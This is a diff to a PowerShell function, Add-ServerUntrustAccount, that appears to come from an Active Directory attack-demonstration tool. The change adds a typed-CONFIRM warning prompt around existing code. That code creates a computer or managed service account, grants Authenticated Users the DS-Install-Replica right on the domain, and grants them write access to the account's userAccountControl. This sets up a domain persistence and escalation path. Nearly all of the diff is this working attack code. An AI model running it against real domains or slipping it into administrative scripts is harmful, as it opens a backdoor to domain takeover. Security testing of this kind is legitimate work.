@@ -173,77 +173,88 @@ function Add-ServerUntrustAccount
 	}
 	else
 	{
+		$Check_Confirmation = Read-Host @"
+WARNING: This script is a demonstration of an attack technique and it will grant the Authenticated Users security
+principal the DS-Install-Replica privilege in your domain. This privilege exposes the domain to a number of attack
+vectors. Before running this script you should understand the full potential impact of this privilege. 
+Be sure to remove this privilege (see the -Remove switch) when testing is complete.
+To continue, type CONFIRM
+"@
 		
-		#Convert Password to SecureString
-		$Sec_Password = ConvertTo-SecureString -AsPlainText -Force -String $Password
-		
-		##############################
-		### Create Computer or MSA ###
-		##############################
-		
-		If ($MSA)
+		if ($Check_Confirmation -eq "CONFIRM")
 		{
-			Write-Verbose -Message "Creating Managed Service Account: $ComputerName"
-			New-ADServiceAccount -RestrictToSingleComputer -Name $ComputerName -Enabled $true -AccountPassword $Sec_Password -ErrorAction Stop
-			Write-Verbose -Message "Created Managed Service Account: $ComputerName"
-		}
-		else
+			
+			#Convert Password to SecureString
+			$Sec_Password = ConvertTo-SecureString -AsPlainText -Force -String $Password
+			
+			##############################
+			### Create Computer or MSA ###
+			##############################
+			
+			If ($MSA)
+			{
+				Write-Verbose -Message "Creating Managed Service Account: $ComputerName"
+				New-ADServiceAccount -RestrictToSingleComputer -Name $ComputerName -Enabled $true -AccountPassword $Sec_Password -ErrorAction Stop
+				Write-Verbose -Message "Created Managed Service Account: $ComputerName"
+			} else
+			{
+				Write-Verbose -Message "Creating Computer Account: $ComputerName"
+				New-ADComputer $ComputerName -AccountPassword $Sec_Password -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName $DNSName -ErrorAction Stop
+				Write-Verbose -Message "Created Computer Account: $ComputerName"
+			}
+			
+			
+			
+			#####################################
+			### Create DS-Install-Replica ACL ###
+			#####################################
+			
+			Write-Verbose -Message "Starting DS-Install-Replica Permission Addition"
+			$path = "AD:\$DomainDN"
+			$acl = Get-Acl -Path $path -ErrorAction Stop
+			
+			$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
+			$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
+			$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
+			$GUID = [GUID]"9923a32a-3607-11d2-b9be-0000f87a36b2" # DS-Install-Replica Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-install-replica)
+			
+			# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.extendedrightaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_ExtendedRightAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_Guid_
+			$ace = New-Object System.DirectoryServices.ExtendedRightAccessRule($IdentityReference, $AccessControlType, $GUID) -ErrorAction Stop
+			$acl.AddAccessRule($ace)
+			Write-Verbose -Message "DS-Install-Replica ACE added to ACL object. Attempting to set the ACL..."
+			Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
+			Write-Verbose -Message "DS-Install-Replica Permission Successfully Added"
+			
+			#####################################
+			### Create UserAccountControl ACL ###
+			#####################################
+			
+			Write-Verbose "Starting UserAccountControl Permission Addition"
+			if ($MSA -or $GMSA)
+			{
+				$DN_For_Path = Get-ADServiceAccount $ComputerName | Select-Object -ExpandProperty DistinguishedName
+			} else
+			{
+				$DN_For_Path = Get-ADComputer $ComputerName | Select-Object -ExpandProperty DistinguishedName
+			}
+			$path = "AD:\$DN_For_Path"
+			$acl = Get-Acl -Path $path -ErrorAction Stop
+			
+			$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
+			$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
+			$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
+			$GUID = [GUID]"bf967a68-0de6-11d0-a285-00aa003049e2" # User Account Control Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol)
+			
+			# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.propertyaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_PropertyAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_DirectoryServices_PropertyAccess_System_Guid_
+			$ace = New-Object System.DirectoryServices.PropertyAccessRule($IdentityReference, $AccessControlType, $PropertyAccess, $GUID) -ErrorAction Stop
+			$acl.AddAccessRule($ace)
+			Write-Verbose -Message "UserAccountControl ACE added to ACL object. Attempting to set the ACL..."
+			Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
+			Write-Verbose -Message "UserAccountControl Permission Successfully Added"
+		} else
 		{
-			Write-Verbose -Message "Creating Computer Account: $ComputerName"
-			New-ADComputer $ComputerName -AccountPassword $Sec_Password -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName $DNSName -ErrorAction Stop
-			Write-Verbose -Message "Created Computer Account: $ComputerName"
+			Write-Host "Function aborted."
 		}
-		
-		
-		
-		#####################################
-		### Create DS-Install-Replica ACL ###
-		#####################################
-		
-		Write-Verbose -Message "Starting DS-Install-Replica Permission Addition"
-		$path = "AD:\$DomainDN"
-		$acl = Get-Acl -Path $path -ErrorAction Stop
-		
-		$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
-		$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
-		$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
-		$GUID = [GUID]"9923a32a-3607-11d2-b9be-0000f87a36b2" # DS-Install-Replica Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-install-replica)
-		
-		# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.extendedrightaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_ExtendedRightAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_Guid_
-		$ace = New-Object System.DirectoryServices.ExtendedRightAccessRule($IdentityReference, $AccessControlType, $GUID) -ErrorAction Stop
-		$acl.AddAccessRule($ace)
-		Write-Verbose -Message "DS-Install-Replica ACE added to ACL object. Attempting to set the ACL..."
-		Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
-		Write-Verbose -Message "DS-Install-Replica Permission Successfully Added"
-		
-		#####################################
-		### Create UserAccountControl ACL ###
-		#####################################
-		
-		Write-Verbose "Starting UserAccountControl Permission Addition"
-		if ($MSA -or $GMSA)
-		{
-			$DN_For_Path = Get-ADServiceAccount $ComputerName | Select-Object -ExpandProperty DistinguishedName
-		}
-		else
-		{
-			$DN_For_Path = Get-ADComputer $ComputerName | Select-Object -ExpandProperty DistinguishedName
-		}
-		$path = "AD:\$DN_For_Path"
-		$acl = Get-Acl -Path $path -ErrorAction Stop
-		
-		$IdentityReference = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList @([System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
-		$AccessControlType = [System.Security.AccessControl.AccessControlType]::Allow
-		$PropertyAccess = [System.DirectoryServices.PropertyAccess]::Write
-		$GUID = [GUID]"bf967a68-0de6-11d0-a285-00aa003049e2" # User Account Control Schema GUID (https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol)
-		
-		# https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.propertyaccessrule.-ctor?view=dotnet-plat-ext-3.1#System_DirectoryServices_PropertyAccessRule__ctor_System_Security_Principal_IdentityReference_System_Security_AccessControl_AccessControlType_System_DirectoryServices_PropertyAccess_System_Guid_
-		$ace = New-Object System.DirectoryServices.PropertyAccessRule($IdentityReference, $AccessControlType, $PropertyAccess, $GUID) -ErrorAction Stop
-		$acl.AddAccessRule($ace)
-		Write-Verbose -Message "UserAccountControl ACE added to ACL object. Attempting to set the ACL..."
-		Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
-		Write-Verbose -Message "UserAccountControl Permission Successfully Added"
-		
 	}
 }
 
